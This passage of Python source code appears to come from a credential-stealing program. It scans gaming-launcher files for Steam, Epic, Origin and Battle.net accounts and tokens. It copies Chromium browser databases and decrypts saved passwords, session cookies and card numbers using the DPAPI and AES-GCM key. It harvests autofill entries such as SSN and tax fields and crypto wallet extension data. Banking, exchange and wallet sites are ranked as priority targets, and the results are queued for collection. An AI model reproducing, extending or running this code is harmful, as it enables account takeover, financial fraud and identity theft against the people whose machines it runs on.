                        logger.debug(f"Error analyzing gaming file {file_path}: {e}")
                        continue
                
                dir_info["directory_analysis"]["file_count"] += len(files)
        
        except Exception as e:
            logger.error(f"❌ Error analyzing gaming directory {dir_path}: {e}")
            dir_info["error"] = str(e)
        
        return dir_info if dir_info["files"] else None
    
    def _is_gaming_file_relevant(self, filename, platform):
        """Enhanced check for relevant gaming files"""
        filename_lower = filename.lower()
        
        # Universal relevant patterns
        universal_patterns = [
            "config", "setting", "user", "login", "account", "profile",
            "save", "data", "cache", "log", "registry", "preference"
        ]
        
        # Platform-specific patterns
        platform_patterns = {
            "steam": ["vdf", "acf", "blob", "ssfn", "steam"],
            "epic_games": ["epic", "launcher", "unreal", "manifest"],
            "origin": ["origin", "ea", "electronic"],
            "uplay": ["ubisoft", "uplay", "connect"],
            "battle_net": ["blizzard", "battle", "diablo", "wow", "overwatch"],
            "gog": ["gog", "galaxy", "cdprojekt"],
            "rockstar": ["rockstar", "social", "launcher"]
        }
        
        all_patterns = universal_patterns + platform_patterns.get(platform, [])
        
        return any(pattern in filename_lower for pattern in all_patterns)
    
    def _extract_gaming_credentials_enhanced(self, file_path, platform):
        """Enhanced extraction of gaming platform credentials"""
        credentials = []
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Platform-specific credential extraction
            if platform == "steam":
                credentials.extend(self._extract_steam_credentials(content, file_path))
            elif platform == "epic_games":
                credentials.extend(self._extract_epic_credentials(content, file_path))
            elif platform == "origin":
                credentials.extend(self._extract_origin_credentials(content, file_path))
            elif platform == "battle_net":
                credentials.extend(self._extract_battlenet_credentials(content, file_path))
            
            # Universal credential patterns
            universal_creds = self._extract_universal_gaming_credentials(content, file_path, platform)
            credentials.extend(universal_creds)
            
        except Exception as e:
            logger.debug(f"Error extracting credentials from {file_path}: {e}")
        
        return credentials
    
    def _extract_steam_credentials(self, content, file_path):
        """Extract Steam-specific credentials"""
        credentials = []
        
        try:
            # Steam VDF format parsing
            if ".vdf" in file_path.lower():
                # Login users extraction
                import re
                
                # Extract user accounts
                user_pattern = r'"(\d+)"\s*{[^}]*"PersonaName"\s*"([^"]+)"[^}]*"RememberPassword"\s*"(\d+)"'
                matches = re.findall(user_pattern, content, re.DOTALL)
                
                for user_id, persona_name, remember_password in matches:
                    credentials.append({
                        "platform": "steam",
                        "type": "user_account",
                        "user_id": user_id,
                        "username": persona_name,
                        "remember_password": bool(int(remember_password)),
                        "source_file": os.path.basename(file_path),
                        "extraction_time": datetime.now().isoformat(),
                        "critical_level": "high"
                    })
                
                # Extract API keys and tokens
                token_pattern = r'"(api[_-]?key|token|auth[_-]?key)"\s*"([^"]+)"'
                token_matches = re.findall(token_pattern, content, re.IGNORECASE)
                
                for key_type, key_value in token_matches:
                    credentials.append({
                        "platform": "steam",
                        "type": "api_credential",
                        "key_type": key_type,
                        "key_value": key_value,
                        "source_file": os.path.basename(file_path),
                        "extraction_time": datetime.now().isoformat(),
                        "critical_level": "critical"
                    })
        
        except Exception as e:
            logger.debug(f"Error extracting Steam credentials: {e}")
        
        return credentials
    
    def _extract_epic_credentials(self, content, file_path):
        """Extract Epic Games-specific credentials"""
        credentials = []
        
        try:
            # Epic Games JSON format
            if file_path.lower().endswith('.json'):
                try:
                    data = json.loads(content)
                    
                    # Extract user authentication data
                    if isinstance(data, dict):
                        cred_keys = ['username', 'email', 'access_token', 'refresh_token', 
                                   'remember_me', 'auto_login', 'account_id']
                        
                        extracted_data = {}
                        for key in cred_keys:
                            if key in data:
                                extracted_data[key] = data[key]
                        
                        if extracted_data:
                            credentials.append({
                                "platform": "epic_games",
                                "type": "user_authentication",
                                "data": extracted_data,
                                "source_file": os.path.basename(file_path),
                                "extraction_time": datetime.now().isoformat(),
                                "critical_level": "high"
                            })
                
                except json.JSONDecodeError:
                    pass
        
        except Exception as e:
            logger.debug(f"Error extracting Epic credentials: {e}")
        
        return credentials
    
    def _extract_origin_credentials(self, content, file_path):
        """Extract Origin/EA credentials"""
        credentials = []
        
        try:
            # Origin XML format
            if ".xml" in file_path.lower():
                import xml.etree.ElementTree as ET
                try:
                    root = ET.fromstring(content)
                    
                    # Extract user data
                    user_elements = root.findall(".//User") + root.findall(".//Account")
                    for user_elem in user_elements:
                        user_data = {}
                        for child in user_elem:
                            if child.text and len(child.text.strip()) > 0:
                                user_data[child.tag] = child.text
                        
                        if user_data:
                            credentials.append({
                                "platform": "origin",
                                "type": "user_data",
                                "data": user_data,
                                "source_file": os.path.basename(file_path),
                                "extraction_time": datetime.now().isoformat(),
                                "critical_level": "medium"
                            })
                
                except ET.ParseError:
                    pass
        
        except Exception as e:
            logger.debug(f"Error extracting Origin credentials: {e}")
        
        return credentials
    
    def _extract_battlenet_credentials(self, content, file_path):
        """Extract Battle.net credentials"""
        credentials = []
        
        try:
            # Battle.net config format
            lines = content.split('\n')
            current_section = None
            config_data = {}
            
            for line in lines:
                line = line.strip()
                if line.startswith('[') and line.endswith(']'):
                    current_section = line[1:-1]
                    config_data[current_section] = {}
                elif '=' in line and current_section:
                    key, value = line.split('=', 1)
                    config_data[current_section][key.strip()] = value.strip()
            
            # Extract relevant sections
            relevant_sections = ['User', 'Account', 'Login', 'Auth']
            for section in relevant_sections:
                if section in config_data and config_data[section]:
                    credentials.append({
                        "platform": "battle_net",
                        "type": f"config_{section.lower()}",
                        "data": config_data[section],
                        "source_file": os.path.basename(file_path),
                        "extraction_time": datetime.now().isoformat(),
                        "critical_level": "medium"
                    })
        
        except Exception as e:
            logger.debug(f"Error extracting Battle.net credentials: {e}")
        
        return credentials
    
    def _extract_universal_gaming_credentials(self, content, file_path, platform):
        """Extract universal gaming credentials using regex patterns"""
        credentials = []
        
        try:
            # Universal patterns for gaming credentials
            patterns = {
                "email": r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
                "username": r'["\']?(?:username|user|login)["\']?\s*[:=]\s*["\']?([^"\'\\s]{3,30})["\']?',
                "token": r'["\']?(?:token|auth|key)["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})["\']?',
                "session": r'["\']?(?:session|sess)["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{10,})["\']?'
            }
            
            for pattern_name, pattern_regex in patterns.items():
                matches = re.findall(pattern_regex, content, re.IGNORECASE)
                if matches:
                    credentials.append({
                        "platform": platform,
                        "type": f"universal_{pattern_name}",
                        "matches": matches[:5],  # Limit to first 5 matches
                        "source_file": os.path.basename(file_path),
                        "extraction_time": datetime.now().isoformat(),
                        "critical_level": "medium"
                    })
        
        except Exception as e:
            logger.debug(f"Error extracting universal gaming credentials: {e}")
        
        return credentials
    
    def _extract_steam_specific_data(self, steam_paths):
        """Extract Steam-specific additional data"""
        steam_extras = {
            "steam_guard_files": [],
            "workshop_data": [],
            "friend_lists": [],
            "game_stats": []
        }
        
        try:
            for path in steam_paths:
                if os.path.isdir(path):
                    # Look for Steam Guard files
                    ssfn_files = glob.glob(os.path.join(path, "ssfn*"))
                    steam_extras["steam_guard_files"].extend(ssfn_files)
                    
                    # Look for additional Steam data
                    userdata_path = os.path.join(os.path.dirname(path), "userdata")
                    if os.path.exists(userdata_path):
                        for user_dir in os.listdir(userdata_path):
                            user_path = os.path.join(userdata_path, user_dir)
                            if os.path.isdir(user_path):
                                # Extract user-specific data
                                user_config = os.path.join(user_path, "config", "localconfig.vdf")
                                if os.path.exists(user_config):
                                    steam_extras["game_stats"].append(user_config)
        
        except Exception as e:
            logger.debug(f"Error extracting Steam-specific data: {e}")
        
        return steam_extras if any(steam_extras.values()) else None
    
    def _extract_epic_specific_data(self, epic_paths):
        """Extract Epic Games-specific additional data"""
        epic_extras = {
            "saved_games": [],
            "manifest_files": [],
            "cloud_saves": []
        }
        
        try:
            for path in epic_paths:
                if os.path.isdir(path):
                    # Look for saved games
                    saved_path = os.path.join(path, "Saved")
                    if os.path.exists(saved_path):
                        saved_files = glob.glob(os.path.join(saved_path, "**", "*.sav"), recursive=True)
                        epic_extras["saved_games"].extend(saved_files[:10])  # Limit to 10 files
                    
                    # Look for manifest files
                    manifest_files = glob.glob(os.path.join(path, "**", "*.manifest"), recursive=True)
                    epic_extras["manifest_files"].extend(manifest_files[:5])
        
        except Exception as e:
            logger.debug(f"Error extracting Epic-specific data: {e}")
        
        return epic_extras if any(epic_extras.values()) else None

class AdvancedBrowserDataExtractor:
    """🌐 Advanced browser data extraction with comprehensive credential harvesting"""
    
    def __init__(self, priority_queue):
        self.priority_queue = priority_queue
        self.extracted_data = {}
        self.extraction_stats = {
            "browsers_scanned": 0,
            "profiles_found": 0,
            "passwords_extracted": 0,
            "cookies_extracted": 0,
            "autofill_extracted": 0,
            "extensions_found": 0
        }
    
    def extract_all_browser_data(self):
        """Extract comprehensive browser data with HIGH priority"""
        logger.info("🌐 Starting ADVANCED browser data extraction...")
        
        extraction_start = time.time()
        
        for browser_name, paths in CONFIG["BROWSER_PATHS"].items():
            logger.info(f"🎯 Deep scanning {browser_name} browser...")
            browser_data = self._extract_browser_data_comprehensive(browser_name, paths)
            
            if browser_data and browser_data.get("profiles"):
                self.extracted_data[browser_name] = browser_data
                self.extraction_stats["browsers_scanned"] += 1
                self.extraction_stats["profiles_found"] += len(browser_data["profiles"])
                
                # Count extracted items
                for profile_data in browser_data["profiles"].values():
                    self.extraction_stats["passwords_extracted"] += len(profile_data.get("passwords", []))
                    self.extraction_stats["cookies_extracted"] += len(profile_data.get("cookies", []))
                    self.extraction_stats["autofill_extracted"] += len(profile_data.get("autofill", []))
                    self.extraction_stats["extensions_found"] += len(profile_data.get("extensions", []))
                
                # Add to HIGH priority queue
                self.priority_queue.add_item({
                    "type": "browser_comprehensive_data",
                    "browser": browser_name,
                    "data": browser_data,
                    "priority": CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["HIGH"],
                    "size_estimate": self._calculate_browser_data_size(browser_data),
                    "extraction_method": "advanced_comprehensive"
                }, priority=CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["HIGH"])
                
                logger.info(f"🌐 {browser_name}: {len(browser_data['profiles'])} profiles extracted")
        
        extraction_time = time.time() - extraction_start
        
        logger.info(f"✅ BROWSER EXTRACTION COMPLETE:")
        logger.info(f"   🌐 Browsers: {self.extraction_stats['browsers_scanned']}")
        logger.info(f"   👤 Profiles: {self.extraction_stats['profiles_found']}")
        logger.info(f"   🔒 Passwords: {self.extraction_stats['passwords_extracted']}")
        logger.info(f"   🍪 Cookies: {self.extraction_stats['cookies_extracted']}")
        logger.info(f"   📝 Autofill: {self.extraction_stats['autofill_extracted']}")
        logger.info(f"   🔌 Extensions: {self.extraction_stats['extensions_found']}")
        logger.info(f"   ⏱️ Time: {extraction_time:.2f}s")
        
        return self.extracted_data
    
    def _extract_browser_data_comprehensive(self, browser_name, paths):
        """Comprehensive browser data extraction"""
        browser_data = {
            "browser": browser_name,
            "extraction_method": "advanced_comprehensive",
            "profiles": {},
            "browser_info": {},
            "extraction_time": datetime.now().isoformat(),
            "paths_scanned": []
        }
        
        try:
            found_path = None
            
            for path_pattern in paths:
                expanded_path = os.path.expandvars(path_pattern)
                
                if "*" in expanded_path:
                    matching_paths = glob.glob(expanded_path)
                    for path in matching_paths:
                        if os.path.exists(path):
                            found_path = path
                            break
                else:
                    if os.path.exists(expanded_path):
                        found_path = expanded_path
                        break
                
                if found_path:
                    break
            
            if not found_path:
                logger.warning(f"❌ No valid path found for {browser_name}")
                return None
            
            browser_data["main_path"] = found_path
            browser_data["paths_scanned"].append(found_path)
            
            # Extract browser info
            browser_data["browser_info"] = self._extract_browser_info(found_path, browser_name)
            
            # Extract profile data
            if browser_name.lower() == "firefox":
                browser_data["profiles"] = self._extract_firefox_comprehensive_data(found_path)
            else:
                browser_data["profiles"] = self._extract_chromium_comprehensive_data(found_path)
            
            return browser_data if browser_data["profiles"] else None
            
        except Exception as e:
            logger.error(f"❌ Comprehensive browser extraction failed for {browser_name}: {e}")
            browser_data["error"] = str(e)
            return browser_data
    
    def _extract_browser_info(self, browser_path, browser_name):
        """Extract general browser information"""
        browser_info = {
            "version": "unknown",
            "installation_date": "unknown",
            "last_used": "unknown",
            "user_data_size": 0
        }
        
        try:
            # Try to get browser version
            if browser_name.lower() != "firefox":
                local_state_path = os.path.join(browser_path, "Local State")
                if os.path.exists(local_state_path):
                    with open(local_state_path, 'r', encoding='utf-8') as f:
                        local_state = json.load(f)
                        browser_info["version"] = local_state.get("browser", {}).get("last_known_google_chrome_version", "unknown")
            
            # Calculate total size
            if os.path.exists(browser_path):
                total_size = 0
                for root, dirs, files in os.walk(browser_path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            total_size += os.path.getsize(file_path)
                        except:
                            continue
                browser_info["user_data_size"] = total_size
        
        except Exception as e:
            logger.debug(f"Error extracting browser info: {e}")
        
        return browser_info
    
    def _extract_chromium_comprehensive_data(self, user_data_path):
        """Comprehensive data extraction from Chromium-based browsers"""
        profiles_data = {}
        
        try:
            # Discover all profiles
            profile_names = self._discover_chromium_profiles(user_data_path)
            
            logger.info(f"🔍 Found {len(profile_names)} Chromium profiles to scan")
            
            for profile_name in profile_names:
                profile_path = os.path.join(user_data_path, profile_name)
                if os.path.exists(profile_path):
                    logger.info(f"📊 Extracting data from profile: {profile_name}")
                    profile_data = self._extract_chromium_profile_comprehensive(profile_path, profile_name)
                    if profile_data:
                        profiles_data[profile_name] = profile_data
        
        except Exception as e:
            logger.error(f"❌ Error in comprehensive Chromium extraction: {e}")
        
        return profiles_data
    
    def _discover_chromium_profiles(self, user_data_path):
        """Discover all Chromium browser profiles"""
        profile_names = ["Default"]
        
        try:
            # Check Local State for profile info
            local_state_path = os.path.join(user_data_path, "Local State")
            if os.path.exists(local_state_path):
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                    if "profile" in local_state and "info_cache" in local_state["profile"]:
                        profile_names = list(local_state["profile"]["info_cache"].keys())
            
            # Also scan for Profile directories
            for item in os.listdir(user_data_path):
                if item.startswith("Profile ") and os.path.isdir(os.path.join(user_data_path, item)):
                    if item not in profile_names:
                        profile_names.append(item)
        
        except Exception as e:
            logger.debug(f"Error discovering profiles: {e}")
        
        return profile_names
    
    def _extract_chromium_profile_comprehensive(self, profile_path, profile_name):
        """Comprehensive extraction from Chromium profile"""
        profile_data = {
            "profile_name": profile_name,
            "path": profile_path,
            "passwords": [],
            "cookies": [],
            "autofill": [],
            "extensions": [],
            "local_storage": {},
            "bookmarks": [],
            "history": [],
            "downloads": [],
            "preferences": {},
            "extraction_stats": {
                "extraction_time": datetime.now().isoformat(),
                "databases_processed": 0,
                "errors_encountered": 0
            }
        }
        
        try:
            # Extract passwords with enhanced decryption
            login_data_path = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_data_path):
                profile_data["passwords"] = self._extract_passwords_enhanced(login_data_path)
                profile_data["extraction_stats"]["databases_processed"] += 1
                logger.info(f"🔒 Extracted {len(profile_data['passwords'])} passwords from {profile_name}")
            
            # Extract cookies with priority filtering
            cookies_path = os.path.join(profile_path, "Cookies")
            if os.path.exists(cookies_path):
                profile_data["cookies"] = self._extract_cookies_comprehensive(cookies_path)
                profile_data["extraction_stats"]["databases_processed"] += 1
                logger.info(f"🍪 Extracted {len(profile_data['cookies'])} cookies from {profile_name}")
            
            # Extract autofill with credit card data
            web_data_path = os.path.join(profile_path, "Web Data")
            if os.path.exists(web_data_path):
                profile_data["autofill"] = self._extract_autofill_comprehensive(web_data_path)
                profile_data["extraction_stats"]["databases_processed"] += 1
                logger.info(f"📝 Extracted {len(profile_data['autofill'])} autofill entries from {profile_name}")
            
            # Extract extensions with detailed analysis
            extensions_path = os.path.join(profile_path, "Extensions")
            if os.path.exists(extensions_path):
                profile_data["extensions"] = self._extract_extensions_comprehensive(extensions_path)
                logger.info(f"🔌 Extracted {len(profile_data['extensions'])} extensions from {profile_name}")
            
            # Extract local storage with crypto focus
            local_storage_path = os.path.join(profile_path, "Local Storage")
            if os.path.exists(local_storage_path):
                profile_data["local_storage"] = self._extract_local_storage_comprehensive(local_storage_path)
                logger.info(f"💾 Extracted local storage from {len(profile_data['local_storage'])} domains")
            
            # Extract bookmarks
            bookmarks_path = os.path.join(profile_path, "Bookmarks")
            if os.path.exists(bookmarks_path):
                profile_data["bookmarks"] = self._extract_bookmarks_enhanced(bookmarks_path)
            
            # Extract browsing history (limited)
            history_path = os.path.join(profile_path, "History")
            if os.path.exists(history_path):
                profile_data["history"] = self._extract_history_limited(history_path)
            
            # Extract preferences
            preferences_path = os.path.join(profile_path, "Preferences")
            if os.path.exists(preferences_path):
                profile_data["preferences"] = self._extract_preferences_enhanced(preferences_path)
        
        except Exception as e:
            logger.error(f"❌ Error in comprehensive profile extraction: {e}")
            profile_data["extraction_stats"]["errors_encountered"] += 1
        
        return profile_data
    
    def _extract_passwords_enhanced(self, login_data_path):
        """Enhanced password extraction with improved decryption"""
        passwords = []
        temp_db = None
        
        try:
            temp_db = tempfile.mktemp(suffix='.db')
            shutil.copy2(login_data_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Enhanced password query with more fields
            cursor.execute("""
                SELECT origin_url, action_url, username_element, username_value,
                       password_element, password_value, date_created, date_last_used,
                       date_password_modified, times_used, form_data, signon_realm
                FROM logins
                ORDER BY date_last_used DESC
                LIMIT 2000
            """)
            
            decryption_key = self._get_browser_decryption_key()
            
            for row in cursor.fetchall():
                password_data = {
                    "origin_url": row[0],
                    "action_url": row[1], 
                    "username_element": row[2],
                    "username_value": row[3],
                    "password_element": row[4],
                    "date_created": row[6],
                    "date_last_used": row[7],
                    "date_password_modified": row[8] if len(row) > 8 else None,
                    "times_used": row[9] if len(row) > 9 else 0,
                    "signon_realm": row[11] if len(row) > 11 else "",
                    "is_critical": True,
                    "decryption_attempted": False,
                    "priority_score": self._calculate_password_priority(row[0], row[3])
                }
                
                # Enhanced password decryption
                if row[5] and decryption_key:
                    try:
                        decrypted_password = self._decrypt_password_enhanced(row[5], decryption_key)
                        if decrypted_password:
                            password_data["decrypted_password"] = decrypted_password
                            password_data["decryption_attempted"] = True
                            password_data["decryption_successful"] = True
                        else:
                            password_data["decryption_successful"] = False
                    except Exception as e:
                        password_data["decryption_error"] = str(e)
                        password_data["decryption_successful"] = False
                
                passwords.append(password_data)
            
            conn.close()
            
            # Sort by priority score
            passwords.sort(key=lambda x: x.get("priority_score", 0), reverse=True)
            
            logger.info(f"🔒 Enhanced password extraction: {len(passwords)} passwords")
            
        except Exception as e:
            logger.error(f"❌ Enhanced password extraction failed: {e}")
        finally:
            if temp_db and os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        return passwords
    
    def _calculate_password_priority(self, origin_url, username):
        """Calculate priority score for passwords"""
        score = 1
        
        if not origin_url:
            return score
        
        url_lower = origin_url.lower()
        
        # High-priority domains
        critical_domains = {
            'gmail.com': 10, 'google.com': 9, 'facebook.com': 8, 'twitter.com': 7,
            'instagram.com': 7, 'linkedin.com': 6, 'github.com': 8, 'paypal.com': 10,
            'amazon.com': 8, 'microsoft.com': 8, 'apple.com': 8, 'discord.com': 6,
            'telegram.org': 6, 'binance.com': 10, 'coinbase.com': 10, 'crypto.com': 10,
            'metamask.io': 10, 'phantom.app': 10
        }
        
        # Check domain priority
        for domain, domain_score in critical_domains.items():
            if domain in url_lower:
                score += domain_score
                break
        
        # Username quality indicators
        if username and len(username) > 3:
            score += 2
            if '@' in username:  # Email addresses are more valuable
                score += 3
        
        return score
    
    def _get_browser_decryption_key(self):
        """Get browser decryption key for password decryption"""
        try:
            # Try multiple common browser Local State locations
            potential_paths = [
                os.path.join(os.environ.get('USERPROFILE', ''), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'),
                os.path.join(os.environ.get('USERPROFILE', ''), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Local State'),
                os.path.join(os.environ.get('USERPROFILE', ''), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State')
            ]
            
            for local_state_path in potential_paths:
                if os.path.exists(local_state_path):
                    try:
                        with open(local_state_path, 'r', encoding='utf-8') as f:
                            local_state = json.load(f)
                        
                        if 'os_crypt' in local_state and 'encrypted_key' in local_state['os_crypt']:
                            encrypted_key = local_state['os_crypt']['encrypted_key']
                            encrypted_key = base64.b64decode(encrypted_key)[5:]  # Remove DPAPI prefix
                            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                            return key
                    except Exception as e:
                        logger.debug(f"Failed to get decryption key from {local_state_path}: {e}")
                        continue
        
        except Exception as e:
            logger.debug(f"Error getting browser decryption key: {e}")
        
        return None
    
    def _decrypt_password_enhanced(self, encrypted_password, key):
        """Enhanced password decryption with multiple method support"""
        try:
            if not encrypted_password or not key:
                return ""
            
            # Handle v10+ encryption (AES-GCM)
            if encrypted_password[:3] == b'v10':
                encrypted_data = encrypted_password[3:]
                nonce = encrypted_data[:12]
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted_data = cipher.decrypt(encrypted_data[12:])
                return decrypted_data.decode('utf-8', errors='ignore')
            
            # Handle older encryption (DPAPI)
            else:
                decrypted_data = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                return decrypted_data.decode('utf-8', errors='ignore')
        
        except Exception as e:
            logger.debug(f"Password decryption failed: {e}")
            return ""
    
    def _extract_cookies_comprehensive(self, cookies_db_path):
        """Comprehensive cookie extraction with priority filtering"""
        cookies = []
        temp_db = None
        
        try:
            temp_db = tempfile.mktemp(suffix='.db')
            shutil.copy2(cookies_db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Priority domains for cookie extraction
            priority_domains = [
                'gmail.com', 'google.com', 'facebook.com', 'twitter.com', 'instagram.com',
                'linkedin.com', 'github.com', 'paypal.com', 'amazon.com', 'microsoft.com',
                'apple.com', 'discord.com', 'telegram.org', 'binance.com', 'coinbase.com',
                'crypto.com', 'metamask.io', 'ethereum.org', 'bitcoin.org', 'phantom.app',
                'solflare.com', 'keplr.app', 'yoroi-wallet.com'
            ]
            
            # Build query for priority domains
            domain_conditions = " OR ".join([f"host_key LIKE '%{domain}%'" for domain in priority_domains])
            
            cursor.execute(f"""
                SELECT host_key, name, value, path, expires_utc, encrypted_value,
                       creation_utc, last_access_utc, is_secure, is_httponly, has_expires
                FROM cookies 
                WHERE ({domain_conditions}) 
                   OR name LIKE '%token%' 
                   OR name LIKE '%session%' 
                   OR name LIKE '%auth%'
                   OR name LIKE '%login%'
                   OR name LIKE '%credential%'
                ORDER BY last_access_utc DESC
                LIMIT 5000
            """)
            
            decryption_key = self._get_browser_decryption_key()
            
            for row in cursor.fetchall():
                cookie_data = {
                    "host": row[0],
                    "name": row[1],
                    "value": row[2],
                    "path": row[3],
                    "expires": row[4],
                    "creation_utc": row[6] if len(row) > 6 else None,
                    "last_access_utc": row[7] if len(row) > 7 else None,
                    "is_secure": bool(row[8]) if len(row) > 8 else False,
                    "is_httponly": bool(row[9]) if len(row) > 9 else False,
                    "has_expires": bool(row[10]) if len(row) > 10 else False,
                    "is_critical": True,
                    "priority_score": self._calculate_cookie_priority(row[0], row[1])
                }
                
                # Decrypt encrypted cookies
                if row[5] and not row[2] and decryption_key:
                    try:
                        decrypted_value = self._decrypt_password_enhanced(row[5], decryption_key)
                        if decrypted_value:
                            cookie_data["value"] = decrypted_value
                            cookie_data["was_encrypted"] = True
                    except Exception as e:
                        cookie_data["decryption_error"] = str(e)
                
                cookies.append(cookie_data)
            
            conn.close()
            
            # Sort by priority score
            cookies.sort(key=lambda x: x.get("priority_score", 0), reverse=True)
            
        except Exception as e:
            logger.error(f"❌ Comprehensive cookie extraction failed: {e}")
        finally:
            if temp_db and os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        return cookies
    
    def _calculate_cookie_priority(self, host, name):
        """Calculate priority score for cookies"""
        score = 1
        
        if not host or not name:
            return score
        
        host_lower = host.lower()
        name_lower = name.lower()
        
        # High-priority domains
        critical_domains = {
            'gmail.com': 8, 'google.com': 7, 'facebook.com': 6, 'paypal.com': 9,
            'binance.com': 10, 'coinbase.com': 10, 'crypto.com': 9, 'discord.com': 5
        }
        
        for domain, domain_score in critical_domains.items():
            if domain in host_lower:
                score += domain_score
                break
        
        # High-priority cookie names
        critical_names = {
            'auth': 8, 'token': 9, 'session': 7, 'login': 6, 'credential': 8
        }
        
        for name_pattern, name_score in critical_names.items():
            if name_pattern in name_lower:
                score += name_score
        
        return score
    
    def _extract_autofill_comprehensive(self, web_data_path):
        """Comprehensive autofill extraction including credit cards"""
        autofill_data = []
        temp_db = None
        
        try:
            temp_db = tempfile.mktemp(suffix='.db')
            shutil.copy2(web_data_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Extract credit cards first (most critical)
            try:
                cursor.execute("""
                    SELECT name_on_card, expiration_month, expiration_year,
                           card_number_encrypted, date_modified, guid, use_count
                    FROM credit_cards
                    ORDER BY use_count DESC
                """)
                
                decryption_key = self._get_browser_decryption_key()
                
                for row in cursor.fetchall():
                    card_data = {
                        "type": "credit_card",
                        "name_on_card": row[0],
                        "expiration_month": row[1],
                        "expiration_year": row[2],
                        "date_modified": row[4],
                        "guid": row[5] if len(row) > 5 else "",
                        "use_count": row[6] if len(row) > 6 else 0,
                        "is_critical": True,
                        "priority_score": 10
                    }
                    
                    # Try to decrypt card number
                    if row[3] and decryption_key:
                        try:
                            decrypted_number = self._decrypt_password_enhanced(row[3], decryption_key)
                            if decrypted_number:
                                # Mask the number for security (show only last 4 digits)
                                if len(decrypted_number) > 4:
                                    card_data["masked_number"] = "*" * (len(decrypted_number) - 4) + decrypted_number[-4:]
                                card_data["decryption_successful"] = True
                        except Exception as e:
                            card_data["decryption_error"] = str(e)
                    
                    autofill_data.append(card_data)
                
                logger.info(f"💳 Extracted {len(autofill_data)} credit cards")
                
            except sqlite3.OperationalError:
                logger.debug("Credit cards table not found")
            
            # Extract autofill form data
            cursor.execute("""
                SELECT name, value, count, date_created, date_last_used
                FROM autofill
                WHERE name LIKE '%email%' OR name LIKE '%phone%' OR name LIKE '%address%'
                   OR name LIKE '%name%' OR name LIKE '%ssn%' OR name LIKE '%tax%'
                   OR name LIKE '%city%' OR name LIKE '%zip%' OR name LIKE '%country%'
                ORDER BY date_last_used DESC
                LIMIT 1000
            """)
            
            for row in cursor.fetchall():
                autofill_entry = {
                    "type": "autofill_form",
                    "name": row[0],
                    "value": row[1],
                    "count": row[2],
                    "date_created": row[3],
                    "date_last_used": row[4],
                    "is_critical": self._is_critical_autofill_field(row[0]),
                    "priority_score": self._calculate_autofill_priority(row[0], row[1])
                }
                autofill_data.append(autofill_entry)
            
            conn.close()
            
        except Exception as e:
            logger.error(f"❌ Comprehensive autofill extraction failed: {e}")
        finally:
            if temp_db and os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        return autofill_data
    
    def _is_critical_autofill_field(self, field_name):
        """Check if autofill field contains critical information"""
        critical_patterns = [
            'email', 'phone', 'address', 'ssn', 'social', 'tax',
            'credit', 'card', 'bank', 'account', 'routing'
        ]
        
        field_lower = field_name.lower()
        return any(pattern in field_lower for pattern in critical_patterns)
    
    def _calculate_autofill_priority(self, field_name, field_value):
        """Calculate priority for autofill data"""
        score = 1
        
        field_lower = field_name.lower()
        
        # Critical field types
        if any(pattern in field_lower for pattern in ['email', 'ssn', 'tax', 'credit', 'bank']):
            score += 8
        elif any(pattern in field_lower for pattern in ['phone', 'address', 'name']):
            score += 5
        elif any(pattern in field_lower for pattern in ['city', 'zip', 'country']):
            score += 3
        
        # Value quality indicators
        if field_value and len(str(field_value)) > 5:
            score += 2
            
        return score
    
    def _extract_extensions_comprehensive(self, extensions_path):
        """Comprehensive extension extraction with detailed analysis"""
        extensions = []
        
        try:
            for ext_id in os.listdir(extensions_path):
                ext_path = os.path.join(extensions_path, ext_id)
                if os.path.isdir(ext_path):
                    extension_info = self._analyze_extension_comprehensive(ext_path, ext_id)
                    if extension_info:
                        extensions.append(extension_info)
        
        except Exception as e:
            logger.error(f"❌ Comprehensive extension extraction failed: {e}")
        
        return extensions
    
    def _analyze_extension_comprehensive(self, ext_path, ext_id):
        """Comprehensive analysis of browser extension"""
        try:
            version_dirs = [d for d in os.listdir(ext_path) if os.path.isdir(os.path.join(ext_path, d))]
            if not version_dirs:
                return None
            
            latest_version = sorted(version_dirs, reverse=True)[0]
            version_path = os.path.join(ext_path, latest_version)
            
            extension_info = {
                "id": ext_id,
                "version": latest_version,
                "path": ext_path,
                "version_path": version_path,
                "manifest": {},
                "permissions": [],
                "content_scripts": [],
                "storage_data": {},
                "is_sensitive": False,
                "sensitivity_score": 0
            }
            
            # Analyze manifest
            manifest_path = os.path.join(version_path, "manifest.json")
            if os.path.exists(manifest_path):
                with open(manifest_path, 'r', encoding='utf-8') as f:
                    manifest = json.load(f)
                    
                extension_info["manifest"] = {
                    "name": manifest.get("name", "Unknown"),
                    "version": manifest.get("version", "unknown"),
                    "description": manifest.get("description", ""),
                    "permissions": manifest.get("permissions", []),
                    "content_scripts": manifest.get("content_scripts", [])
                }
                
                # Calculate sensitivity score
                sensitivity_score = self._calculate_extension_sensitivity(manifest)
                extension_info["sensitivity_score"] = sensitivity_score
                extension_info["is_sensitive"] = sensitivity_score > 5
            
            # Extract extension storage data if sensitive
            if extension_info["is_sensitive"]:
                storage_data = self._extract_extension_storage_data(ext_path, ext_id)
                extension_info["storage_data"] = storage_data
            
            return extension_info if extension_info["sensitivity_score"] > 3 else None
            
